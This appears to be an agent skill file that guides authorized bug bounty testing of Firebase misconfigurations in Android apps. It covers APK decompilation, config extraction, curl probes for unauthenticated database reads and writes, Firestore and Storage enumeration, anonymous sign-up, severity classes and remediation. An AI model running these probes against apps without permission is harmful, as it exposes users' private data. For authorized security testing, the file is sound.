---
name: android-firebase-misconfiguration
description: Discover and exploit Firebase misconfigurations in Android APKs — database takeover, storage exposure, auth bypass, PoC validation, HackerOne reporting. Use for Firebase pentest.
---

# Android Firebase Misconfiguration Skill

Automated discovery and controlled validation of Firebase misconfigurations
in Android APKs during **authorized** bug bounty assessments.

> **Authorization required.** Static analysis is safe. Active endpoint
> testing requires explicit written permission. Never alter real user data.

## Quick Start

```bash
python3 scripts/firebase_extract.py target.apk -o /tmp/fb_extracted
python3 scripts/firebase_scan.py /tmp/fb_extracted -o scan_results.json
python3 scripts/firebase_validate.py scan_results.json --authorized -o validated.json
python3 scripts/generate_report.py validated.json -o report.md
```

---

## Phase 1 — Extract Firebase Configuration

### 1.1 Decompile APK
```bash
jadx -d jadx_out/ --deobf target.apk
apktool d target.apk -o apktool_out/
```

### 1.2 Find google-services.json
```bash
find apktool_out/ -name "google-services.json" -o -name "GoogleService-Info.plist"
# Also check assets/, res/raw/, res/values/strings.xml
```

### 1.3 Extract Firebase identifiers
```bash
python3 scripts/firebase_extract.py target.apk
# Extracts: project ID, database URL, storage bucket, API key, app ID
```

### 1.4 Manual string search
```bash
grep -rn "firebaseio.com\|firebasedatabase.app\|firebasestorage.googleapis.com" jadx_out/
grep -rn "firebase_database_url\|google_api_key\|project_id\|google_storage_bucket" apktool_out/res/values/
grep -rn "FirebaseDatabase\|FirebaseFirestore\|FirebaseStorage\|FirebaseAuth" jadx_out/
```

---

## Phase 2 — What to Test

### 2.1 Realtime Database — Unauthorized Read
```bash
# Append .json to database URL
curl -s "https://PROJECT-ID.firebaseio.com/.json" | head -c 500
# "null" = empty or secured
# JSON data = VULNERABLE (unauthorized read)
# {"error":"Permission denied"} = secured
```

### 2.2 Realtime Database — Unauthorized Write
```bash
# ONLY with authorization — use a disposable test node
curl -X PUT -d '{"pentest":"authorized_test"}' \
  "https://PROJECT-ID.firebaseio.com/_pentest_node.json"
# Then immediately delete:
curl -X DELETE "https://PROJECT-ID.firebaseio.com/_pentest_node.json"
```

### 2.3 Cloud Firestore — Document Enumeration
```bash
# REST API query
curl -s "https://firestore.googleapis.com/v1/projects/PROJECT-ID/databases/(default)/documents/COLLECTION"
# Returns documents = misconfigured rules
# 403/permission denied = secured
```

### 2.4 Firebase Storage — Public File Access
```bash
# List files in storage bucket
curl -s "https://firebasestorage.googleapis.com/v0/b/PROJECT-ID.appspot.com/o"
# Returns file listing = VULNERABLE
# 403 = secured

# Download a specific file
curl -s "https://firebasestorage.googleapis.com/v0/b/PROJECT-ID.appspot.com/o/FILE_PATH?alt=media"
```

### 2.5 Firebase Auth — Anonymous Access
```bash
# Check if anonymous auth is enabled
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=API_KEY" \
  -H "Content-Type: application/json" -d '{"returnSecureToken":true}'
# Returns idToken = anonymous auth enabled
# Use this token to test authenticated endpoints
```

### 2.6 Cloud Functions — Unauthenticated Endpoints
```bash
# Common patterns in decompiled code
grep -rn "cloudfunctions.net\|us-central1.*\.cloudfunctions" jadx_out/
# Test discovered endpoints without auth
curl -s "https://us-central1-PROJECT-ID.cloudfunctions.net/FUNCTION_NAME"
```

---

## Phase 3 — Severity Classification

**CRITICAL:**
- Database read returns user PII, credentials, or financial data
- Database write allows modifying user data or escalating privileges
- Storage exposes private documents, photos, or backups
- Service account credentials found in APK

**HIGH:**
- Database read returns non-PII app data
- Anonymous auth + database access combination
- Storage allows unauthorized uploads
- Cloud Functions expose sensitive operations

**MEDIUM:**
- Firebase project ID/API key exposed (not a vuln alone)
- Anonymous auth enabled but no data access
- Storage lists files but they're non-sensitive

**NOT A VULNERABILITY:**
- Firebase API key alone (designed to be client-side)
- Project ID in APK (expected)
- Firebase SDK initialization code (normal)

---

## Phase 4 — Report Writing

Use `templates/vulnerability-report.md`. Key evidence to include:
- curl command showing unauthorized access
- Response data (masked PII)
- Database URL and affected collection/node
- Whether read, write, or both are open
- Data sensitivity assessment

---

## Phase 5 — Remediation

1. **Lock down Security Rules** — require `auth != null` minimum
2. **Owner-only access** — `request.auth.uid == userId`
3. **Enable Firebase App Check** — verify requests from real app
4. **Disable anonymous auth** if not needed
5. **Audit Storage rules** — no public read/write
6. **Use Cloud Functions** for sensitive operations instead of client-direct
7. **Remove service account keys** from APK
8. **Regular rule audits** via Firebase Emulator Suite

---

## References
- Jsmon: Firebase Misconfiguration Exploits — https://blogs.jsmon.sh/what-is-firebase-database-misconfiguration-ways-to-exploit-examples-and-impact/
- HackerOne #684099 — Firebase database takeover
- OWASP MASTG — Firebase security testing
